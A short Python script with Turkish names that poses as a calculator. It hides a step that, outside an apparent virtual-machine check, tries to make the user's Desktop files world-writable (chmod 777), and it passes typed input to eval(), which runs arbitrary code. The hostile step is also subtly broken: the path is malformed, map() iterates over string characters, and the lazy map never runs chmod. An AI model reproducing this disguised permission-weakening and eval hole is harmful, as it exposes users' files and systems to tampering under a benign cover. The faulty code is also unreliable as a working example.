__author__ = "Hacknology"
__date__ = "27.12.2016"
import os
import getpass
import platform
def hesap_makinesi():
    islem = input('[*]İşlem girin: ')
    print(eval(islem))
def chmodder(fpath):
    os.chmod(fpath, 0o777)
if __name__ == '__main__':
    plt = platform.platform()
    if 'xen' in plt:
        hesap_makinesi()
    else:       
        isim = getpass.getuser()
        yol = '/home'+isim+'/Masaüstü'
        map(chmodder, yol)
        hesap_makinesi()
